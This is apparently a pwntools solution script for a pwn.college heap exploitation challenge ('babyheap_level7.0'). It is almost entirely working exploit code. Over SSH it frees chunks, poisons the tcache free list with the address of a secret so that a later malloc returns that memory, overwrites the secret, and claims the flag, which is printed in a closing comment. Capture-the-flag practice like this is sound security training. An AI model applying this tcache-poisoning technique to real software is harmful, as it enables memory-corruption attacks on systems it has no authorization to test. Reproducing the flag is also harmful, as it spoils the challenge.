from pwn import *

def _malloc(index, size):
    io.sendlineafter(b"[*] Function (malloc/free/puts/scanf/send_flag/quit): ", b"malloc")
    io.sendlineafter(b"Index: ", str(index).encode())
    io.sendlineafter(b"Size: ", str(size).encode())

def _free(index):
    io.sendlineafter(b"[*] Function (malloc/free/puts/scanf/send_flag/quit): ", b"free")
    io.sendlineafter(b"Index: ", str(index).encode())

def _scanf(index, data):
    io.sendlineafter(b"[*] Function (malloc/free/puts/scanf/send_flag/quit): ", b"scanf")
    io.sendlineafter(b"Index: ", str(index).encode())
    io.sendline(data)

def _puts(index):
    io.sendlineafter(b"[*] Function (malloc/free/puts/scanf/send_flag/quit): ", b"puts")
    io.sendlineafter(b"Index: ", str(index).encode())

def _send_flag(sec):
    io.sendlineafter(b"[*] Function (malloc/free/puts/scanf/send_flag/quit): ", b"send_flag")
    io.sendlineafter(b"Secret: ", sec)

    io.interactive()

secret_pos = 0x429A2C
s = ssh(host="dojo.pwn.college", user="hacker", keyfile="~/key")
io = s.process("/challenge/babyheap_level7.0")

_malloc(0, 128); _malloc(1, 128)
_free(1); _free(0)

_scanf(0, p64(secret_pos))
_malloc(2, 128); _malloc(3, 128)

_scanf(3, b'a'*16)
_send_flag(b'a'*16)
# Flag: pwn.college{gu4l6LC6HfJTNN3ArhpUiDp1XV6.01M4MDLxIjNyEzW}